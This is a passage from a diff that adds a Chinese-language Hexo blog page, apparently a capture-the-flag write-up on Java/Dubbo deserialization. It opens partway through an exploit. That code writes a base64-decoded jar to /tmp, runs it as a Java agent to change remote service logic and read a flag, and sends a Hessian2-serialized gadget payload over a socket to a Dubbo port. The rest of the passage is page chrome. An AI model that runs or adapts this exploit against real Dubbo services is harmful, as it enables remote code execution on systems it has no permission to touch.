gMAAEITAAAAAA== | base64 -d &gt; /tmp/inject.jar&#x27;)\&quot;&quot;;</span><br>        <span class="hljs-comment">//执行/tmp/inject.jar，修改远程服务方法逻辑，读取flag</span><br><span class="hljs-comment">//        String cmds = &quot;python3 -c \&quot;import os;os.system(&#x27;/dubbo/java/jdk1.8.0_202/bin/java -Dfile.encoding=UTF-8 -classpath /dubbo/java/jdk1.8.0_202/lib/tools.jar:/tmp/inject.jar hack.TestAgentMain&#x27;)\&quot;&quot;;</span><br><br>        setFieldValue(unix, <span class="hljs-string">&quot;lpcFirstCom&quot;</span>,<span class="hljs-keyword">new</span> String[]&#123;cmds,cmds,cmds&#125;);<br><br><br>        JSONObject jo = <span class="hljs-keyword">new</span> JSONObject();<br>        jo.put(<span class="hljs-string">&quot;oops&quot;</span>,unix);<br><br><br>        Field field = out.getClass().getDeclaredField(<span class="hljs-string">&quot;mH2o&quot;</span>);<br>        field.setAccessible(<span class="hljs-keyword">true</span>);<br>        Hessian2Output hessian2Output = (Hessian2Output)field.get(out);<br>        hessian2Output.setSerializerFactory(<span class="hljs-keyword">new</span> SerializerFactory());<br>        hessian2Output.getSerializerFactory().setAllowNonSerializable(<span class="hljs-keyword">true</span>);<br><br><br><span class="hljs-comment">//        out.mH2o.setSerializerFactory(new SerializerFactory());</span><br><span class="hljs-comment">//        hessianOutput.getSerializerFactory().setAllowNonSerializable(true);</span><br><br>        out.writeUTF(<span class="hljs-string">&quot;xxxxx&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;org.apache.dubbo.registry.RegistryService&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;0.0.0&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;$echo&quot;</span>);<br>        out.writeUTF(<span class="hljs-string">&quot;Ljava/lang/Object;&quot;</span>);<br>        out.writeObject(jo);<br>        HashMap hkhash = <span class="hljs-keyword">new</span> HashMap();<br>        hkhash.put(<span class="hljs-string">&quot;aaa&quot;</span>,<span class="hljs-string">&quot;bbb&quot;</span>);<br>        out.writeObject(hkhash);<br><br>        out.flushBuffer();<br>        Bytes.int2bytes(hessian2ByteArrayOutputStream.size(), header, <span class="hljs-number">12</span>);<br>        byteArrayOutputStream.write(header);<br>        byteArrayOutputStream.write(hessian2ByteArrayOutputStream.toByteArray());<br>        <span class="hljs-keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray();<br>        Socket socket = <span class="hljs-keyword">new</span> Socket(<span class="hljs-string">&quot;192.168.101.12&quot;</span>, <span class="hljs-number">20880</span>);<br><br>        OutputStream outputStream = socket.getOutputStream();<br>        outputStream.write(bytes);<br>        outputStream.flush();<br>        outputStream.close();<br><br><br>    &#125;<br>&#125;<br><br><br></code></pre></div></td></tr></table></figure>
+            </div>
+            <hr>
+            <div>
+              <div class="post-metas mb-3">
+                
+                  <div class="post-meta mr-3">
+                    <i class="iconfont icon-category"></i>
+                    
+                      <a class="hover-with-bg" href="/categories/web/">web</a>
+                    
+                  </div>
+                
+                
+                  <div class="post-meta">
+                    <i class="iconfont icon-tags"></i>
+                    
+                      <a class="hover-with-bg" href="/tags/web/">web</a>
+                    
+                      <a class="hover-with-bg" href="/tags/java/">java</a>
+                    
+                  </div>
+                
+              </div>
+              
+                <p class="note note-warning">
+                  
+                    本博客所有文章除特别声明外，均采用 <a target="_blank" href="https://creativecommons.org/licenses/by-sa/4.0/deed.zh" rel="nofollow noopener noopener">CC BY-SA 4.0 协议</a> ，转载请注明出处！
+                  
+                </p>
+              
+              
+                <div class="post-prevnext">
+                  <article class="post-prev col-6">
+                    
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2023/01/03/2023-1-3-csharp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8/">
+                        <span class="hidden-mobile">csharp反序列化入门</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+    
+      <div class="d-none d-lg-block col-lg-2 toc-container" id="toc-ctn">
+        <div id="toc">
+  <p class="toc-header"><i class="iconfont icon-list"></i>&nbsp;目录</p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+      </div>
+    
+  </div>
+</div>
+
+<!-- Custom -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+<!-- 代码语言 -->
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+<!-- 代码块复制 -->
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+<script type="text/javascript" src="/libs/codeBlock/clipboard.min.js"></script>
+<!-- 代码块收缩 -->
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script> 
+<!-- 代码块折行 -->
+<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
+
+    
+
+    
+      <a id="scroll-top-button" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v"
+                 for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+
+    
+  </main>
+
+  <footer class="text-center mt-5 py-3">
+  <div class="footer-content">
+     <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+  </div>
+  
+
+  
+  <!-- 备案信息 -->
+  <div class="beian">
+    <span>
+      <a href="http://beian.miit.gov.cn/" target="_blank" rel="nofollow noopener">
+        京ICP备2022002829号
+      </a>
+    </span>
+    
+  </div>
+
+
+  
+</footer>
+
+
+  <!-- SCRIPTS -->
+  
+  <script  src="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://cdn.jsdelivr.net/npm/jquery@3.6.0/dist/jquery.min.js" ></script>
+<script  src="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+<!-- Plugins -->
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+  
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/tocbot@4.12.3/dist/tocbot.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" ></script>
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/anchor-js@4.3.1/anchor.min.js" ></script>
+
+
+
+  <script defer src="https://cdn.jsdelivr.net/npm/clipboard@2.0.8/dist/clipboard.min.js" ></script>
+
+
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+
+  <script  src="https://cdn.jsdelivr.net/npm/typed.js@2.0.12/lib/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var title = document.getElementById('subtitle').title;
+      
+      typing(title)
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+
+
+<!-- 主题的启动项 保持在最底部 -->
+<script  src="/js/boot.js" ></script>
+
+
+</body>
+</html>
